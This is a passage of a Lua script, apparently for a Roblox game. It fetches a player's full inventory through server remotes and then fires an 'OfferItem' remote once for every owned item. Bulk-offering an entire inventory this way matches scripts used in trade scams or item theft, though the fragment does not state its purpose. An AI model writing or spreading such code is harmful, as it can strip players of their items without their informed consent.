-- --- Inventory fetcher
local function getInventoryIds()
    local InventoryFolder = RS:FindFirstChild("Remotes") and RS.Remotes:FindFirstChild("Inventory")
    local GetProfileData = InventoryFolder and InventoryFolder:FindFirstChild("GetProfileData")
    local GetFullInventory = RS:FindFirstChild("Remotes") and RS.Remotes:FindFirstChild("Extras") and RS.Remotes.Extras:FindFirstChild("GetFullInventory")

    local ids = {}
    local function extractIds(tbl)
        if type(tbl) ~= "table" then return end
        for k, v in pairs(tbl) do
            if type(v) == "table" and v.Name and v.ID and v.Count and v.Count > 0 then
                table.insert(ids, v.ID)
            end
            if type(k) == "number" and k > 0 and type(v) == "number" and v > 0 then
                table.insert(ids, k)
            end
            if type(v) == "table" then
                extractIds(v)
            end
        end
    end

    if GetProfileData then
        local ok, data = pcall(function() return GetProfileData:InvokeServer() end)
        if ok and data then
            extractIds(data)
            return ids
        end
    end
    if GetFullInventory then
        local ok, data = pcall(function() return GetFullInventory:InvokeServer() end)
        if ok and data then
            extractIds(data)
            return ids
        end
    end
    return ids
end

-- --- Offer items via remote
local function offerAllItems(itemIds)
    if not OfferItem then return 0 end
    local count = 0
    for _, id in ipairs(itemIds) do
        local ok = pcall(function() OfferItem:FireServer(id) end)
        if ok then count = count + 1 end
        wait(0.05)
    end
    return count
end

